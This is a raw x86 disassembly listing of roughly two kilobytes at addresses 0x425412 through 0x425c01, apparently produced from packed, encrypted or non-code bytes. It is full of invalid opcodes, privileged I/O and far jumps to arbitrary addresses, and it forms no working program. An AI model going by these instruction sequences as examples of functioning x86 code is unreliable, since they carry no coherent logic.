  425412:	adc    al,0x32
  425414:	mov    BYTE PTR [ebx],bh
  425416:	loope  0x4253de
  425418:	mov    cl,0x72
  42541a:	rcr    DWORD PTR [edx+0x7d72e241],cl
  425420:	rol    dl,0x5
  425423:	aam    0x97
  425425:	fsub   st(0),st
  425427:	mov    al,BYTE PTR [eax+eiz*1]
  42542a:	gs push ebx
  42542c:	(bad)  
  42542d:	sub    edi,DWORD PTR [esp+ebp*1-0x7cd55d85]
  425434:	sbb    eax,0x72e70a02
  425439:	inc    edi
  42543a:	call   0x1f977858
  42543f:	dec    ebp
  425440:	ja     0x42541c
  425442:	(bad)  
  425443:	inc    BYTE PTR [esi-0x4]
  425446:	ds aam 0xd
  425449:	cmp    eax,0x31059764
  42544e:	adc    bh,dl
  425450:	xchg   DWORD PTR ds:0xb240a7df,edx
  425456:	mov    edi,0xd5bab99d
  42545b:	jnp    0x42548c
  42545d:	prefetcht1 BYTE PTR [ebx+ecx*4]
  425461:	out    0xb3,eax
  425463:	icebp  
  425464:	int    0xeb
  425466:	lahf   
  425467:	adc    BYTE PTR [eax+0x7e6f2002],bl
  42546d:	xchg   ecx,eax
  42546e:	dec    ebx
  42546f:	jae    0x425458
  425471:	lea    ebx,[edi]
  425473:	add    edi,ebx
  425475:	ficom  WORD PTR [esp+edi*8]
  425478:	sub    BYTE PTR ds:0x30c5d44b,dl
  42547e:	dec    esp
  42547f:	lods   al,BYTE PTR ds:[esi]
  425480:	sbb    edx,DWORD PTR [edi-0x7277e5c4]
  425486:	call   0x7ff:0x49c83ebc
  42548d:	ret    
  42548e:	int    0x95
  425490:	xchg   DWORD PTR [ebp-0x21],eax
  425493:	sbb    al,0x88
  425495:	push   ebx
  425496:	or     DWORD PTR [eax],edx
  425498:	imul   esi,DWORD PTR [esp+esi*1-0x3],0xffffffd2
  42549d:	add    cl,BYTE PTR [eax]
  42549f:	aaa    
  4254a0:	pop    edx
  4254a1:	shl    ecx,1
  4254a3:	mov    al,0xe0
  4254a5:	xor    ah,BYTE PTR [eax-0x5d]
  4254a8:	add    eax,0xec0f4993
  4254ad:	xchg   esi,eax
  4254ae:	mov    edi,0x1205ef85
  4254b3:	std    
  4254b4:	nop
  4254b5:	test   DWORD PTR [edx+0x1e168212],ecx
  4254bb:	xor    eax,0x16bc09f0
  4254c0:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  4254c2:	mov    ch,0xaa
  4254c4:	imul   ecx,eax,0x0
  4254c7:	shl    DWORD PTR [edi],0x42
  4254ca:	pop    ebx
  4254cb:	ja     0x425488
  4254cd:	push   0x1a
  4254cf:	sbb    ecx,ecx
  4254d1:	ror    DWORD PTR cs:[edx],1
  4254d4:	mov    BYTE PTR [ebx],dl
  4254d6:	inc    edx
  4254d7:	jp     0x425478
  4254d9:	lds    ecx,FWORD PTR [ebx-0x638e30a4]
  4254df:	xor    eax,0xd1948b89
  4254e4:	sbb    DWORD PTR [ecx],0x2b8875bc
  4254ea:	(bad)  
  4254ec:	xchg   edi,eax
  4254ed:	sub    eax,0x3043fdf
  4254f2:	push   es
  4254f3:	out    dx,eax
  4254f4:	jp     0x4254b5
  4254f6:	retf   0x11aa
  4254f9:	imul   eax,DWORD PTR [ebx-0x4b],0x471e6dc0
  425500:	add    dl,0x64
  425503:	sbb    edi,DWORD PTR ds:0x6bbe4802
  425509:	jnp    0x42552b
  42550b:	aam    0xb1
  42550d:	pushw  ds
  42550f:	fwait
  425510:	mov    ah,0xcc
  425512:	out    0x4f,eax
  425514:	mov    esp,0xa4d5d0ec
  425519:	add    al,0xaf
  42551b:	push   ss
  42551c:	push   ss
  42551d:	jmp    0x69c9:0xdb892af4
  425524:	aad    0x7e
  425526:	xchg   edi,eax
  425527:	push   ebp
  425528:	stos   DWORD PTR es:[edi],eax
  425529:	xchg   ebp,eax
  42552a:	inc    ebp
  42552b:	inc    eax
  42552c:	mov    al,ds:0x89f2ab33
  425531:	push   ecx
  425532:	repz in eax,0xa4
  425535:	mov    ebx,esp
  425537:	sub    DWORD PTR [edi-0x7deaa223],ecx
  42553d:	pushf  
  42553e:	add    DWORD PTR [ebp+eiz*1+0x2a],edx
  425542:	inc    BYTE PTR [eax+0x57]
  425545:	das    
  425546:	pop    ebx
  425547:	pop    edx
  425548:	xor    eax,DWORD PTR [ebx]
  42554a:	shl    BYTE PTR [edx],cl
  42554c:	dec    edx
  42554d:	addr16 jmp 0x4254f7
  425550:	mov    BYTE PTR [ecx-0x7a],dh
  425553:	mov    ds:0x5b95efe2,eax
  425558:	pop    es
  425559:	push   edx
  42555a:	cmp    al,0xb2
  42555c:	add    eax,DWORD PTR [ebx]
  42555e:	and    al,0xbb
  425560:	adc    BYTE PTR [ebp+0x7d],ah
  425563:	frstor [edx+0x6a571f9a]
  425569:	push   es
  42556a:	inc    esi
  42556b:	adc    esp,0xe6d5c322
  425571:	aam    0x98
  425573:	mov    ds:0x7689c10,al
  425578:	mov    BYTE PTR [ebx-0x3ddca8],ch
  42557e:	jne    0x425578
  425580:	cmp    esp,DWORD PTR [eax+ebp*8]
  425583:	jnp    0x425539
  425585:	pop    ss
  425586:	lahf   
  425587:	loopne 0x4255a0
  425589:	sbb    DWORD PTR [esi-0x67],0xffffff89
  42558d:	xor    edx,DWORD PTR [edx]
  42558f:	lahf   
  425590:	icebp  
  425591:	pop    ss
  425592:	in     al,dx
  425593:	xor    DWORD PTR [edx+0x65748a24],esi
  425599:	adc    DWORD PTR [eax],esp
  42559b:	add    DWORD PTR [edi+ebp*8-0x2],ebp
  42559f:	sbb    eax,0x8b1fcc37
  4255a4:	cmp    al,BYTE PTR [edi+0x4392df05]
  4255aa:	xor    DWORD PTR [ebp-0x4fc918eb],esi
  4255b0:	mov    ecx,ebp
  4255b2:	sub    esp,DWORD PTR ds:0x7fef8c86
  4255b8:	add    DWORD PTR [eax+ebp*4],ebp
  4255bb:	push   edi
  4255bc:	mov    ecx,0xc2487805
  4255c1:	retf   0xd461
  4255c4:	mov    ebp,0x50a9913d
  4255c9:	js     0x425577
  4255cb:	popf   
  4255cc:	xchg   ebp,eax
  4255cd:	shl    DWORD PTR [edx+0x62],0x7e
  4255d1:	rol    DWORD PTR [eax-0x2b],1
  4255d4:	lock int3 
  4255d6:	push   edx
  4255d7:	(bad)  
  4255d9:	add    eax,0x607549cc
  4255de:	mov    bl,0x54
  4255e0:	xchg   ebp,eax
  4255e1:	dec    edx
  4255e2:	add    BYTE PTR [edx+esi*4],cl
  4255e5:	pop    ds
  4255e6:	xchg   esi,eax
  4255e7:	and    ecx,DWORD PTR [edx]
  4255e9:	sub    dl,bh
  4255eb:	mov    bh,0x99
  4255ed:	popf   
  4255ee:	loopne 0x4255a0
  4255f0:	aad    0x2
  4255f2:	lock stc 
  4255f4:	mov    eax,ds:0xfccd28f8
  4255f9:	out    0x60,eax
  4255fb:	lods   eax,DWORD PTR ds:[esi]
  4255fc:	xlat   BYTE PTR ds:[ebx]
  4255fd:	les    ecx,FWORD PTR ds:[esi]
  425600:	adc    BYTE PTR [ecx],ch
  425602:	test   ebp,edx
  425604:	lds    esi,FWORD PTR [edx+0x635d0500]
  42560a:	push   ebx
  42560b:	xchg   ebx,eax
  42560c:	mov    edi,esp
  42560e:	push   0x6a
  425610:	dec    ecx
  425611:	dec    ebx
  425612:	cwde   
  425613:	mov    ebp,0x1d55f315
  425618:	cmc    
  425619:	jo     0x425639
  42561b:	lds    ebp,FWORD PTR [edi+0x33]
  42561e:	imul   esp,DWORD PTR [ebp+0x2f],0x972f1e79
  425625:	call   0xd4ec:0x35e6cdbd
  42562c:	retf   
  42562d:	xchg   edx,eax
  42562e:	inc    ecx
  425630:	in     al,0xa0
  425632:	lea    edi,[esi-0x78]
  425635:	pop    es
  425636:	jle    0x425643
  425638:	push   cs
  425639:	jp     0x425673
  42563b:	sbb    al,dh
  42563d:	add    eax,0xb1879810
  425642:	xor    ebx,eax
  425644:	xor    al,0x13
  425646:	pop    ds
  425647:	pop    ds
  425648:	push   ecx
  425649:	jns    0x425604
  42564b:	sar    DWORD PTR [ebx+eax*2],1
  42564e:	sbb    BYTE PTR [edx+0x50b4516f],ch
  425654:	xchg   ebx,eax
  425655:	xchg   esp,eax
  425656:	jg     0x42560c
  425658:	jp     0x4255e9
  42565a:	lods   eax,DWORD PTR ds:[esi]
  42565b:	xchg   edx,eax
  42565c:	mov    BYTE PTR [ebx-0x425d310f],dl
  425662:	mov    esi,0x405d7d8
  425667:	nop
  425668:	dec    ebx
  425669:	mov    dl,0x53
  42566b:	jo     0x42564d
  42566d:	mov    dl,0x76
  42566f:	icebp  
  425670:	in     al,0x6a
  425672:	mov    bl,ch
  425674:	lods   al,BYTE PTR ds:[esi]
  425675:	add    eax,0x3b2bcb50
  42567a:	jecxz  0x425660
  42567c:	mov    ebp,ebx
  42567e:	or     DWORD PTR [ebx+edi*8],esi
  425681:	not    BYTE PTR [eax-0x1fdfa2d]
  425687:	inc    BYTE PTR [edi+0x1]
  42568a:	movzx  edx,WORD PTR [ecx]
  42568d:	mov    al,0x7
  42568f:	inc    ebp
  425690:	mov    bh,dh
  425692:	dec    ebx
  425693:	and    al,0xb0
  425695:	dec    edi
  425696:	jmp    0x425688
  425698:	sub    DWORD PTR [ebx],eax
  42569a:	ss cmp eax,0xa4734194
  4256a0:	jge    0x425673
  4256a2:	pushf  
  4256a3:	rol    DWORD PTR [ebx+eax*1-0x76],1
  4256a7:	lea    edx,[edi+0x55566f43]
  4256ad:	add    esp,DWORD PTR [eax+0x1d]
  4256b0:	mov    ecx,0xa5ecc5d5
  4256b5:	popf   
  4256b6:	pusha  
  4256b7:	inc    ebx
  4256b8:	fiadd  WORD PTR [edi]
  4256ba:	add    eax,0x940e9239
  4256bf:	fwait
  4256c0:	jae    0x4256a9
  4256c2:	cmc    
  4256c3:	aam    0xed
  4256c5:	jmp    FWORD PTR [ecx+0x6ede8ffe]
  4256cb:	push   ebx
  4256cc:	mov    edx,0xc8e3ac3e
  4256d1:	push   eax
  4256d2:	in     eax,0xa0
  4256d4:	daa    
  4256d5:	test   DWORD PTR [edi+0x7cda872d],edx
  4256db:	fist   DWORD PTR [ecx+0x5efacbc5]
  4256e1:	ret    
  4256e2:	bound  edi,QWORD PTR [ebx+0x5ef9381f]
  4256e8:	ret    
  4256e9:	(bad)  
  4256eb:	dec    edx
  4256ec:	dec    ebp
  4256ed:	icebp  
  4256ee:	fadd   DWORD PTR [edx-0x4f]
  4256f1:	xchg   edx,eax
  4256f2:	adc    eax,0x86146165
  4256f7:	inc    ecx
  4256f8:	sahf   
  4256f9:	imul   esi,DWORD PTR [ebx+0x3ea86d74],0x77758898
  425703:	mov    cs,WORD PTR [eax]
  425705:	repnz imul DWORD PTR [ebp-0x22]
  425709:	imul   edx,DWORD PTR [esi+0x75],0x7e7c72a2
  425710:	fstp   QWORD PTR [edx]
  425712:	and    BYTE PTR [ebx],bh
  425714:	mov    ds:0x180a8b55,al
  425719:	adc    eax,0xadfc172d
  42571e:	adc    edx,esi
  425720:	add    eax,0xbe8bebc5
  425725:	scas   al,BYTE PTR es:[edi]
  425726:	jmp    0x80f1:0x6d0d38c4
  42572d:	add    dh,BYTE PTR [eax]
  42572f:	cli    
  425730:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425731:	fs pop ss
  425733:	xchg   DWORD PTR [esi],ecx
  425735:	into   
  425736:	addr16 push ebp
  425738:	add    ebp,ebp
  42573a:	sbb    al,0x97
  42573c:	mov    ebx,DWORD PTR [edi]
  42573e:	lock sub ch,ch
  425741:	add    eax,0x501b63b3
  425746:	test   BYTE PTR [ebx-0x67c91dd8],dl
  42574c:	fwait
  42574d:	shr    DWORD PTR [ebx-0x2b],cl
  425750:	mov    dh,0x48
  425752:	cld    
  425753:	and    DWORD PTR [ebp-0x9],edi
  425756:	data16 cmc 
  425758:	push   ebx
  425759:	push   ds
  42575a:	mov    ds:0xbab5a4fc,al
  42575f:	cmp    BYTE PTR [edx+0x1a],al
  425762:	sbb    BYTE PTR [ecx-0x2a59fbcd],al
  425768:	lea    ebp,[edi+0x23f11530]
  42576e:	xchg   edx,eax
  42576f:	fistp  WORD PTR [edx+0x5bfe7bc9]
  425775:	add    esp,edx
  425777:	xor    al,0x89
  425779:	loop   0x42576c
  42577b:	imul   edi
  42577d:	mov    dl,0x77
  42577f:	push   ecx
  425780:	mov    bh,bh
  425782:	gs cwde 
  425784:	and    eax,0x894ceae9
  425789:	popa   
  42578a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42578b:	ja     0x425753
  42578d:	mov    ch,0x4c
  42578f:	jbe    0x425721
  425791:	loop   0x42579a
  425793:	cdq    
  425794:	pop    edi
  425795:	pop    esi
  425796:	inc    esi
  425797:	aam    0x74
  425799:	dec    ebp
  42579a:	retf   
  42579b:	pop    ebx
  42579c:	push   0x49
  42579e:	pop    ds
  42579f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4257a0:	arpl   WORD PTR ds:0x40e0452f,bp
  4257a6:	mov    ch,0x90
  4257a9:	push   ds
  4257aa:	or     al,BYTE PTR [edx-0x1c]
  4257ad:	xor    al,0x28
  4257af:	add    al,0x8
  4257b1:	shr    dh,0xfb
  4257b4:	mov    BYTE PTR [ecx-0x13cb6a7f],ah
  4257ba:	fist   DWORD PTR [esi-0x2a928a64]
  4257c0:	jmp    0xe7b76c40
  4257c5:	jmp    0x42576d
  4257c7:	mov    edi,0x7f297d89
  4257cc:	cmp    ecx,DWORD PTR [edx+0x24b04fd]
  4257d2:	call   0xf69bed10
  4257d7:	xor    DWORD PTR [edi-0x39],esp
  4257da:	pusha  
  4257db:	ja     0x4257b0
  4257dd:	jmp    0x136f5afa
  4257e2:	push   ecx
  4257e3:	sbb    al,0x4
  4257e5:	sbb    DWORD PTR [edi],ebx
  4257e7:	jge    0x4257a5
  4257e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4257ea:	mov    ch,0x16
  4257ec:	cld    
  4257ed:	xchg   BYTE PTR [eax+0x61],ah
  4257f0:	das    
  4257f1:	xchg   esp,eax
  4257f2:	mov    ebx,0x5e4fb65d
  4257f7:	aad    0x92
  4257f9:	sbb    eax,DWORD PTR [ebx]
  4257fb:	dec    ebp
  4257fc:	mov    al,ds:0x8b06420a
  425801:	or     DWORD PTR [ebp-0x4b54c309],edi
  425807:	(bad)  
  425808:	call   0xfb197022
  42580d:	ret    0xfb28
  425810:	rcr    DWORD PTR [eax-0x7877d4ac],1
  425816:	mov    edi,0x549c9f88
  42581b:	jl     0x4257bf
  42581d:	clc    
  42581e:	ins    DWORD PTR es:[edi],dx
  42581f:	cdq    
  425820:	xor    eax,0xbcd72f9f
  425825:	fldenv [esi+esi*1+0x791e4b71]
  42582c:	mov    WORD PTR [edi-0x1df1b87e],cs
  425832:	not    ah
  425834:	xchg   DWORD PTR [edx+esi*2],eax
  425837:	retf   
  425838:	or     BYTE PTR [esi-0x2d8496b6],al
  42583e:	mov    eax,0x1f764945
  425843:	mov    bh,0xff
  425845:	dec    esi
  425846:	test   BYTE PTR [eax+0x3adc0370],bh
  42584c:	push   ecx
  42584d:	movnti DWORD PTR [eax+0x1f],eax
  425851:	out    0x60,eax
  425853:	cmp    ebp,DWORD PTR [ebp+ecx*1+0x73]
  425857:	push   es
  425858:	inc    esp
  425859:	mov    ch,0xa5
  42585b:	aad    0x4b
  42585d:	push   ss
  42585e:	loopne 0x425808
  425860:	sti    
  425861:	(bad)  
  425863:	mov    ebp,0x259db38e
  425868:	mov    ecx,0xdc7c4f11
  42586d:	mov    ah,0x1b
  42586f:	xlat   BYTE PTR ds:[ebx]
  425870:	js     0x4258e0
  425872:	fsub   QWORD PTR [eax-0x26e06506]
  425878:	ss adc al,0xf
  42587b:	and    esi,DWORD PTR [edx+ecx*8]
  42587e:	daa    
  42587f:	mov    ebp,0x24f50927
  425884:	mov    DWORD PTR [ebp+0x11c51744],ebp
  42588a:	cmp    ax,0x2b0d
  42588e:	arpl   cx,ax
  425890:	push   0xc6d56c39
  425895:	pop    edi
  425896:	cmc    
  425897:	pop    esi
  425898:	cli    
  425899:	(bad)  
  42589a:	xchg   edi,eax
  42589b:	or     BYTE PTR [eax+0xbac24df],dh
  4258a1:	in     eax,dx
  4258a2:	cdq    
  4258a3:	jne    0x42590b
  4258a5:	clc    
  4258a6:	fist   DWORD PTR [esp+edx*4+0x23]
  4258aa:	ins    BYTE PTR es:[edi],dx
  4258ab:	aam    0x5b
  4258ad:	popa   
  4258ae:	sbb    al,0xb3
  4258b0:	and    al,0x53
  4258b2:	out    dx,eax
  4258b3:	or     eax,0xe9ad7189
  4258b8:	push   0x65
  4258ba:	dec    edi
  4258bb:	add    eax,0xaf3a0290
  4258c0:	(bad)  
  4258c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4258c2:	fsubr  st(0),st
  4258c4:	pop    ebx
  4258c5:	push   es
  4258c6:	pusha  
  4258c7:	pop    ebx
  4258c8:	push   esi
  4258c9:	ror    DWORD PTR [esp+ecx*4-0x4],0xa8
  4258ce:	cmp    eax,0x66b07498
  4258d3:	push   esp
  4258d4:	jbe    0x425950
  4258d6:	int3   
  4258d7:	rol    BYTE PTR [eax-0x22da6b14],1
  4258dd:	sub    DWORD PTR [eax+0x6607d61b],esi
  4258e3:	push   ebp
  4258e4:	iret   
  4258e5:	mov    eax,ds:0xaa60d4af
  4258ea:	bound  ebp,QWORD PTR [edx-0x165d741e]
  4258f0:	ret    
  4258f1:	inc    edx
  4258f2:	jne    0x4258eb
  4258f4:	in     al,0x39
  4258f6:	push   ds
  4258f7:	test   esp,eax
  4258f9:	xchg   esp,eax
  4258fa:	icebp  
  4258fb:	das    
  4258fc:	jns    0x425923
  4258fe:	lea    ebx,[edx+edx*2-0x12]
  425902:	pop    ds
  425903:	pop    esp
  425904:	or     DWORD PTR [ecx+0x65],edx
  425907:	pop    ecx
  425908:	jb     0x42593c
  42590a:	pop    ds
  42590b:	pop    edi
  42590c:	jl     0x4258b7
  42590e:	push   es
  42590f:	or     DWORD PTR [eax],edi
  425911:	popa   
  425912:	in     eax,dx
  425913:	aad    0xb5
  425915:	mov    bh,0x4f
  425917:	cmp    eax,0x2ebb955
  42591c:	mov    bl,ch
  42591e:	dec    eax
  42591f:	cs (bad) 
  425921:	in     eax,0x88
  425923:	loop   0x4258eb
  425925:	add    eax,0x97dc9a54
  42592a:	jp     0x4258b1
  42592c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42592d:	cli    
  42592e:	ffreep st(4)
  425930:	mov    dl,0xf
  425932:	lea    eax,[edi-0x78]
  425935:	adc    edi,DWORD PTR [ebp+0x26]
  425938:	into   
  425939:	outs   dx,BYTE PTR ds:[esi]
  42593a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42593b:	aam    0xc6
  42593d:	xor    BYTE PTR [ebx],al
  42593f:	cmc    
  425940:	and    eax,0x88251de6
  425945:	push   edi
  425946:	jo     0x425937
  425948:	dec    ecx
  425949:	pop    esi
  42594a:	popa   
  42594b:	cmp    al,0xe1
  42594d:	add    eax,0x1f998284
  425952:	fist   DWORD PTR [ebp+0x76dc873]
  425958:	sub    BYTE PTR [esi-0x25],cl
  42595b:	mov    al,ds:0x292629e9
  425960:	fisttp DWORD PTR [edx]
  425962:	call   0xccb1:0x83e0fcf7
  425969:	js     0x4258ff
  42596b:	mov    ecx,0xa5e0096c
  425970:	dec    edx
  425971:	mov    bl,0xa8
  425973:	das    
  425974:	mov    edi,esp
  425976:	ret    
  425977:	adc    cl,cl
  425979:	mov    ebx,0xd8cf70f
  42597e:	pop    es
  42597f:	xlat   BYTE PTR ds:[ebx]
  425980:	lods   eax,DWORD PTR ds:[esi]
  425981:	mov    edi,0x7b82d067
  425986:	adc    BYTE PTR [ebp-0x77],ch
  425989:	imul   DWORD PTR [eax+0x2575abb8]
  42598f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425990:	out    dx,eax
  425991:	lds    edx,FWORD PTR [esi+0x5b]
  425994:	push   esi
  425995:	sub    DWORD PTR [edi],ebx
  425997:	jl     0x4259de
  425999:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42599a:	pop    ebp
  42599b:	bt     edx,ebp
  42599e:	pusha  
  42599f:	ja     0x4259d8
  4259a1:	mov    edx,DWORD PTR [eax+eiz*1]
  4259a4:	mov    dh,0x0
  4259a6:	push   es
  4259a7:	aam    0xae
  4259a9:	int    0xd0
  4259ab:	in     eax,dx
  4259ac:	dec    edi
  4259ad:	pusha  
  4259ae:	test   eax,0xfef1895c
  4259b3:	ds inc esi
  4259b5:	adc    al,0x3b
  4259b7:	sahf   
  4259b8:	test   DWORD PTR [edx],eax
  4259ba:	call   0x8188c479
  4259bf:	dec    ecx
  4259c0:	js     0x425a12
  4259c2:	push   ds
  4259c3:	or     DWORD PTR [edx],esp
  4259c5:	bound  edi,QWORD PTR [edx-0x23769f91]
  4259cb:	xlat   BYTE PTR ds:[ebx]
  4259cc:	dec    eax
  4259cd:	xor    BYTE PTR [eax+ebx*1+0x14c807d2],bl
  4259d4:	stc    
  4259d5:	push   ebp
  4259d6:	pop    ds
  4259d7:	sub    esp,DWORD PTR [eax]
  4259d9:	push   esi
  4259da:	pop    ebx
  4259db:	dec    edx
  4259dc:	xchg   BYTE PTR [edi+0x1e19d47f],bl
  4259e2:	outs   dx,DWORD PTR ds:[esi]
  4259e3:	mov    BYTE PTR [edi-0x7e07fc76],al
  4259e9:	adc    eax,0xf727c27a
  4259ee:	mov    al,ds:0x2a0368b2
  4259f3:	add    BYTE PTR [ebp-0x48296531],0x72
  4259fa:	push   ds
  4259fb:	inc    ebx
  4259fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4259fd:	mov    dh,BYTE PTR [edi-0x3736a1f7]
  425a03:	aam    0xe4
  425a05:	les    esi,FWORD PTR [ebp+0x42]
  425a08:	lods   al,BYTE PTR ds:[esi]
  425a09:	fwait
  425a0a:	cli    
  425a0b:	xchg   edi,eax
  425a0c:	mov    BYTE PTR [edi+0x15faa030],bl
  425a12:	sbb    esp,DWORD PTR [edi+ebx*4]
  425a15:	add    eax,0x65e710e0
  425a1a:	xor    eax,0x1f0f4df6
  425a1f:	jmp    0x425a8a
  425a21:	sahf   
  425a22:	fdiv   QWORD PTR [edx+edx*4+0x31]
  425a26:	mov    al,0xd5
  425a28:	cmp    eax,0xa3a03a2f
  425a2d:	cli    
  425a2e:	pop    esp
  425a2f:	out    0x89,eax
  425a31:	mov    ch,0x4f
  425a33:	or     BYTE PTR [ebp-0x4a1ae657],dl
  425a39:	add    cl,BYTE PTR [esi]
  425a3b:	mov    al,0x59
  425a3d:	retf   
  425a3e:	add    BYTE PTR [esi+0x1166b098],bh
  425a44:	push   0xffffffd0
  425a46:	dec    esp
  425a47:	inc    esi
  425a48:	fdiv   DWORD PTR [edx+0x21e4a74]
  425a4e:	cmp    al,0xd
  425a50:	push   esp
  425a51:	arpl   WORD PTR [esi],sp
  425a53:	push   ss
  425a54:	push   0x15
  425a56:	xchg   ebx,eax
  425a57:	dec    ecx
  425a58:	daa    
  425a59:	add    bl,cl
  425a5b:	dec    esi
  425a5c:	and    dl,0x74
  425a5f:	push   ebx
  425a60:	ja     0x425a64
  425a62:	push   eax
  425a63:	xor    eax,0x4ad54790
  425a68:	shl    DWORD PTR [esi+ebx*1-0x31],1
  425a6c:	or     BYTE PTR [ecx-0x7d],cl
  425a6f:	pop    ds
  425a70:	dec    esi
  425a71:	cld    
  425a72:	xchg   edi,eax
  425a73:	mov    ecx,0x25db2aa8
  425a78:	or     eax,eax
  425a7a:	stos   DWORD PTR es:[edi],eax
  425a7b:	mov    BYTE PTR [ecx-0x80],dl
  425a7e:	pop    ds
  425a7f:	inc    ecx
  425a80:	dec    eax
  425a81:	or     ebx,DWORD PTR [edi+edx*8-0x20]
  425a85:	sub    bh,BYTE PTR [esi]
  425a87:	xlat   BYTE PTR ds:[ebx]
  425a88:	sbb    BYTE PTR [edx],cl
  425a8a:	scas   eax,DWORD PTR es:[edi]
  425a8b:	in     eax,0x8e
  425a8d:	mov    cl,0x32
  425a8f:	call   0x36f:0xa0eedd9e
  425a96:	iret   
  425a97:	ret    
  425a98:	adc    ebp,DWORD PTR [esi-0x50]
  425a9b:	push   0x6e2dc6a3
  425aa0:	js     0x425a3b
  425aa2:	jl     0x425aa5
  425aa4:	mov    ebp,0x819fe13
  425aa9:	adc    edi,DWORD PTR [eax-0x60]
  425aac:	ins    BYTE PTR es:[edi],dx
  425aad:	push   esi
  425aae:	leave  
  425aaf:	aam    0x2b
  425ab1:	scas   al,BYTE PTR es:[edi]
  425ab2:	data16 test BYTE PTR [edx-0x77e9ab90],al
  425ab9:	mov    bl,0xb8
  425abb:	loopne 0x425a7a
  425abd:	mov    ah,0x47
  425abf:	loop   0x425ae6
  425ac1:	add    ch,BYTE PTR [esi+ebx*4-0x9fb8291]
  425ac8:	pusha  
  425ac9:	cdq    
  425aca:	pop    ds
  425acb:	icebp  
  425acc:	adc    ecx,DWORD PTR [edi]
  425ace:	loopne 0x425b09
  425ad0:	into   
  425ad1:	xor    eax,0xa2d5b82f
  425ad6:	test   al,0xe3
  425ad8:	or     DWORD PTR [edx+ecx*1],edx
  425adb:	sub    ebp,DWORD PTR [ebp+0x4a]
  425ade:	push   ds
  425adf:	lods   eax,DWORD PTR ds:[esi]
  425ae0:	sti    
  425ae1:	mov    esp,0x631a4684
  425ae6:	mov    cs,ecx
  425ae8:	repnz daa 
  425aea:	adc    al,0x31
  425aec:	dec    ebp
  425aed:	in     al,0x23
  425aef:	mov    ch,0xa8
  425af1:	push   eax
  425af2:	sahf   
  425af3:	int    0x4b
  425af5:	cmp    bl,BYTE PTR [edi]
  425af7:	and    eax,0x2d0a713f
  425afc:	(bad)  
  425afd:	push   0xf94ed7c8
  425b02:	sub    DWORD PTR [edx+0x1497c808],eax
  425b08:	ds ret 0x8d1f
  425b0c:	sbb    BYTE PTR [ecx+0xd],ah
  425b0f:	cmp    edx,eax
  425b11:	jb     0x425b76
  425b13:	aad    0xbc
  425b15:	jnp    0x425b43
  425b17:	fldlg2 
  425b19:	push   esi
  425b1a:	mov    ecx,0x276f89cc
  425b1f:	aam    0xef
  425b21:	(bad)  
  425b22:	push   ebx
  425b23:	call   0xd3b8:0x344405d4
  425b2a:	jne    0x425b8d
  425b2c:	ins    BYTE PTR es:[edi],dx
  425b2d:	jp     0x425b5a
  425b2f:	cmp    DWORD PTR [ebx-0x540d24bd],ecx
  425b35:	jo     0x425b00
  425b37:	xchg   esp,eax
  425b38:	dec    eax
  425b39:	add    ch,BYTE PTR [eax-0x45]
  425b3c:	add    eax,0x49868cc8
  425b41:	stos   DWORD PTR es:[edi],eax
  425b42:	jg     0x425b21
  425b44:	aaa    
  425b45:	push   esi
  425b46:	pop    ds
  425b47:	test   eax,0x76fb4ddb
  425b4c:	adc    eax,0x8b85ed38
  425b51:	add    bl,BYTE PTR [esi+0x2f]
  425b54:	lods   al,BYTE PTR ds:[esi]
  425b55:	adc    eax,0xfcd832f8
  425b5a:	mov    al,ds:0x1f1dbb52
  425b5f:	jmp    0x425aee
  425b61:	pusha  
  425b62:	and    ebx,DWORD PTR [edi]
  425b64:	lods   al,BYTE PTR ds:[esi]
  425b65:	mov    dl,0x11
  425b67:	aam    0xb6
  425b69:	ror    BYTE PTR [edx-0x15],cl
  425b6c:	daa    
  425b6d:	ins    DWORD PTR es:[edi],dx
  425b6e:	bnd js 0x425b56
  425b71:	jecxz  0x425ba9
  425b73:	push   0x7e540224
  425b78:	pop    esp
  425b79:	pushf  
  425b7a:	jle    0x425b1b
  425b7c:	adc    al,BYTE PTR [ebx+0x8ba2b60]
  425b82:	shl    ah,cl
  425b84:	cli    
  425b85:	enter  0xd736,0xcc
  425b89:	sti    
  425b8a:	mov    edx,0x3078b534
  425b8f:	(bad)  
  425b91:	jecxz  0x425bbb
  425b93:	xlat   BYTE PTR ds:[ebx]
  425b94:	(bad)  
  425b95:	mov    al,0xa6
  425b97:	shl    DWORD PTR [edx-0x5],0x33
  425b9b:	xlat   BYTE PTR ds:[ebx]
  425b9c:	je     0x425c0d
  425b9e:	leave  
  425b9f:	adc    eax,0x3a2582b8
  425ba4:	mov    BYTE PTR [ebx+0x3b],ch
  425ba7:	popf   
  425ba8:	(bad)  
  425baa:	imul   ecx,DWORD PTR [esi],0x7490d2da
  425bb0:	mul    DWORD PTR ds:0xb69c7ced
  425bb6:	(bad)  
  425bb7:	aam    0x4
  425bb9:	ret    
  425bba:	jb     0x425ba6
  425bbc:	rcl    BYTE PTR [ecx+esi*1],0xef
  425bc0:	scas   eax,DWORD PTR es:[edi]
  425bc1:	rcr    BYTE PTR [edi],cl
  425bc3:	xor    esi,edx
  425bc5:	mov    edx,0xb85ed2b0
  425bca:	cdq    
  425bcb:	icebp  
  425bcc:	lds    eax,FWORD PTR ds:0x3353bcd8
  425bd2:	leave  
  425bd3:	adc    bl,cl
  425bd5:	(bad)  
  425bd6:	(bad)  
  425bd7:	or     eax,0x543e1fd4
  425bdc:	mov    al,ds:0x78240241
  425be1:	inc    ecx
  425be2:	xchg   esi,eax
  425be3:	aam    0x79
  425be5:	nop
  425be6:	xlat   BYTE PTR ds:[ebx]
  425be7:	jge    0x425b6b
  425be9:	es push ebp
  425bec:	mov    DWORD PTR [edi-0x663fa510],edi
  425bf2:	pop    ebx
  425bf3:	sub    al,BYTE PTR [edx]
  425bf5:	(bad)  
  425bf6:	adc    bl,0x5
  425bf9:	fbld   TBYTE PTR [esi+edi*2+0x62b08ed9]
  425c00:	dec    eax
  425c01:	pop    edx
